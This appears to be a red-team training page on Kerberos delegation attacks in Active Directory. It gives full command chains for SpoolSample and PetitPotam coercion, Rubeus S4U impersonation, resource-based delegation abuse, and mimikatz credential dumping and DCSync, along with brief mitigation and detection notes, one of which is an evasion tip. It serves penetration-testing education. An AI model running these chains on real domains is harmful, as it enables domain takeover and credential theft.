---
layout: training-page
title: "Kerberos Delegation Attacks — Red Team Academy"
module: "Active Directory"
tags:
  - kerberos
  - delegation
  - unconstrained
  - constrained
  - rbcd
  - active-directory
page_key: "ad-kerberos-delegation"
render_with_liquid: false
---

# Kerberos Delegation Attacks

Kerberos delegation allows a service to act on behalf of a user when accessing other services. There are three types — unconstrained, constrained, and resource-based constrained delegation (RBCD) — each exploitable in different ways to escalate privileges or compromise domain controllers.

## Delegation Types Overview

```
Unconstrained Delegation  — Service can delegate to ANY service using the user's TGT
                            Dangerous: TGT saved in memory of the service host
                            Attack: Coerce DC to authenticate → capture DC TGT → DCSync

Constrained Delegation    — Service can only delegate to pre-defined services (msDS-AllowedToDelegateTo)
                            Attack: S4U2self + S4U2proxy to impersonate any user to target services

RBCD (Resource-Based)     — Target resource controls who can delegate to it (msDS-AllowedToActOnBehalfOfOtherIdentity)
                            Attack: Write to target's RBCD attribute → create machine account → impersonate admin
```

## Unconstrained Delegation

When a user authenticates to a host with unconstrained delegation, their TGT is cached in that host's memory. If you can coerce a DC to authenticate to your compromised host, you capture the DC's TGT and can perform DCSync.

### Find Unconstrained Delegation Hosts

```
# PowerView
Get-ADComputer -Filter {TrustedForDelegation -eq $True}

# Native PowerShell
Get-ADComputer -LDAPFilter "(&(objectCategory=Computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" -Properties DNSHostName,userAccountControl

# bloodyAD (Linux)
bloodyAD -u user -p 'Password123' -d domain.lab --host 10.10.10.10 get search \
  --filter '(&(objectCategory=Computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))' \
  --attr sAMAccountName,userAccountControl

# NetExec
nxc ldap 10.10.10.10 -u username -p password --trusted-for-delegation

# BloodHound query
MATCH (c:Computer {unconstraineddelegation:true}) RETURN c
```

### Exploit via SpoolService Coercion (SpoolSample)

```
# Step 1: On your unconstrained delegation host, start monitoring for incoming tickets
Rubeus.exe monitor /interval:1

# Step 2: Coerce the DC to connect back (triggers it to send its TGT)
# SpoolSample — MS-RPRN coercion
.\SpoolSample.exe DC01.domain.lab HELPDESK.domain.lab
# DC01 = target DC, HELPDESK = our unconstrained delegation host

# Alternatively via printerbug.py (Linux)
printerbug.py 'domain/username:password'@DC01.domain.lab HELPDESK.domain.lab

# Step 3: Load the captured DC TGT
.\Rubeus.exe asktgs /ticket:<base64_ticket> /service:LDAP/dc.lab.local,cifs/dc.lab.local /ptt

# Step 4: DCSync using the injected ticket
mimikatz# lsadump::dcsync /domain:domain.lab /user:krbtgt
```

### Exploit via PetitPotam Coercion

```
# Step 1: Monitor with Rubeus
Rubeus.exe monitor /interval:1

# Step 2: Coerce via MS-EFSRPC
git clone https://github.com/topotam/PetitPotam
python3 petitpotam.py -d domain.lab -u user -p Password123 HELPDESK_IP DC01_IP

# Unauthenticated (some versions)
python3 petitpotam.py -d '' -u '' -p '' HELPDESK_IP DC01_IP

# Step 3: Extract and load ticket from Rubeus output
.\Rubeus.exe asktgs /ticket:<base64> /ptt
```

### Mitigation

```
# Mark sensitive accounts as "Account is sensitive and cannot be delegated"
# Add privileged accounts to Protected Users group
# Disable Print Spooler service on DCs where not needed
```

## Constrained Delegation

Services with constrained delegation can impersonate users, but only to specific services defined in `msDS-AllowedToDelegateTo`. Using Rubeus S4U2 attacks, you can impersonate any user (including Domain Admin) to those allowed services.

### Find Constrained Delegation

```
# PowerView
Get-NetComputer -TrustedToAuth | select samaccountname,msds-allowedtodelegateto | ft
Get-DomainComputer -TrustedToAuth | select -exp dnshostname

# bloodyAD
bloodyAD -u user -p 'Password123' -d domain.lab --host 10.10.10.10 get search \
  --filter '(&(objectCategory=Computer)(userAccountControl:1.2.840.113556.1.4.803:=16777216))' \
  --attr sAMAccountName,msds-allowedtodelegateto

# BloodHound query
MATCH p = (a)-[:AllowedToDelegate]->(c:Computer) RETURN p
```

### S4U2 Attack with Rubeus

```
# With a password
Rubeus.exe s4u /nowrap \
  /msdsspn:"time/target.local" \
  /altservice:cifs \
  /impersonateuser:"administrator" \
  /domain:"domain.lab" \
  /user:"svc_account" \
  /password:"ServicePassword"

# With an NT hash
Rubeus.exe s4u \
  /user:svc_account \
  /rc4:<NT_HASH> \
  /impersonateuser:Administrator \
  /domain:domain.lab \
  /dc:dc01.domain.lab \
  /msdsspn:time/srv01.domain.lab \
  /altservice:cifs \
  /ptt

# With AES256 key (stealthier — avoids RC4 downgrade detection)
# First dump AES keys from the machine
mimikatz# privilege::debug
mimikatz# token::elevate
mimikatz# sekurlsa::ekeys

Rubeus.exe s4u \
  /impersonateuser:Administrator \
  /msdsspn:cifs/srv.domain.local \
  /user:machine_account$ \
  /aes256:<AES256_KEY> \
  /ptt
```

### Using Existing Ticket (S4U with Delegation)

```
# Get a delegable TGT
Rubeus.exe tgtdeleg /nowrap
Rubeus.exe triage
Rubeus.exe dump /luid:0x12d1f7

# Perform S4U2 with the ticket
Rubeus.exe s4u \
  /impersonateuser:Administrator \
  /msdsspn:cifs/srv.domain.local \
  /ticket:doIFRjCC...BTA== \
  /ptt
```

### Impacket (Linux)

```
getST.py -spn HOST/SQL01.domain.lab 'domain/svc_account:Password' \
  -impersonate Administrator -dc-ip 10.10.10.10

# Use the service ticket
export KRB5CCNAME=Administrator.ccache
smbclient.py -k -no-pass domain.lab/Administrator@target.domain.lab
```

## Resource-Based Constrained Delegation (RBCD)

RBCD was introduced in Windows Server 2012. The *target resource* controls who can delegate to it via the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute. If you have write access to this attribute on a computer object, you can make it trust an account you control — then impersonate any user to that computer.

### Prerequisites

```
# Need: WriteProperty or GenericAll/GenericWrite on the target computer object
# Need: Ability to create machine accounts (MachineAccountQuota > 0, default is 10)

# Check MachineAccountQuota
Get-ADDomain | Select-Object -ExpandProperty DistinguishedName |
  Get-ADObject -Properties ms-DS-MachineAccountQuota
```

### Full RBCD Attack Chain

```
# Step 1: Import required modules
Import-Module .\powermad.ps1    # For creating machine accounts
Import-Module .\powerview.ps1

# Step 2: Get attacker SID (or use existing compromised account SID)
$AttackerSID = Get-DomainUser SvcJoinComputerToDom -Properties objectsid | Select -Expand objectsid

# Step 3: Create a new machine account we control
New-MachineAccount -MachineAccount swktest -Password $(ConvertTo-SecureString 'Weakest123*' -AsPlainText -Force)

# Linux alternative
bloodyAD -u user -p 'Password123' -d domain.lab --host 10.10.10.10 add computer swktest 'Weakest123*'

# Step 4: Get the new machine account's SID
$ComputerSid = Get-DomainComputer swktest -Properties objectsid | Select -Expand objectsid

# Step 5: Build security descriptor and write to target computer's RBCD attribute
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer TARGET_COMPUTER | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

# Linux alternative (add, then remove after exploit)
bloodyAD --host 10.1.0.4 -u user -p 'Password123' -d domain.lab add rbcd 'TARGET_COMPUTER$' 'swktest$'

# Step 6: Get hash for our new machine account
Rubeus.exe hash /password:'Weakest123*' /user:swktest$ /domain:domain.lab

# Step 7: S4U2 — impersonate Domain Admin on the target
.\Rubeus.exe s4u \
  /user:swktest$ \
  /rc4:<HASH_FROM_ABOVE> \
  /impersonateuser:Administrator \
  /msdsspn:cifs/TARGET_COMPUTER.domain.lab \
  /ptt \
  /altservice:cifs,http,host,rpcss,wsman,ldap

# Verify access
dir \\TARGET_COMPUTER.domain.lab\c$
```

### Cleanup

```
# Remove the RBCD attribute from the target computer
bloodyAD --host 10.1.0.4 -u user -p 'Password123' -d domain.lab remove rbcd 'TARGET_COMPUTER$' 'swktest$'

# Delete the machine account
Remove-ADComputer -Identity swktest
```

## Kerberos S4U Extensions

```
S4U2self  — Service obtains a ST to itself on behalf of a user (even without the user's credentials)
            Used to get a forwardable ticket for the user

S4U2proxy — Service uses the ticket from S4U2self to obtain a ST to another service
            This is the actual delegation step

# When constrained delegation is configured on a service:
# S4U2self gets a TGS for any user to the current service
# S4U2proxy then gets a TGS for that user to the allowed target service
# Combined result: full impersonation chain
```

## Detection Notes

```
# Unconstrained delegation alerts:
# - TGT forwarding in Kerberos traffic (large Kerberos tickets with AP-REQ)
# - PrintSpooler calls from unexpected hosts (MS-RPRN event)
# - Event 4648: Explicit credential use from unexpected host

# Constrained delegation alerts:
# - S4U2self requests from service accounts (Kerberos event with unusual SPN)
# - RC4 downgrade in Kerberos (preferably use AES256 to reduce noise)

# RBCD alerts:
# - Event 5136: Directory Service Changes — modification of msDS-AllowedToActOnBehalfOfOtherIdentity
# - New machine account creation (Event 4741) followed by RBCD attribute change
```

## Resources

- InternalAllTheThings — `swisskyrepo.github.io/InternalAllTheThings`
- Wagging the Dog: Abusing RBCD — Elad Shamir — `shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html`
- Exploiting Unconstrained Delegation — Riccardo Ancarani — `riccardoancarani.it`
- Rubeus — `github.com/GhostPack/Rubeus`
- bloodyAD — `github.com/CravateRouge/bloodyAD`
- Impacket getST — `github.com/SecureAuthCorp/impacket`
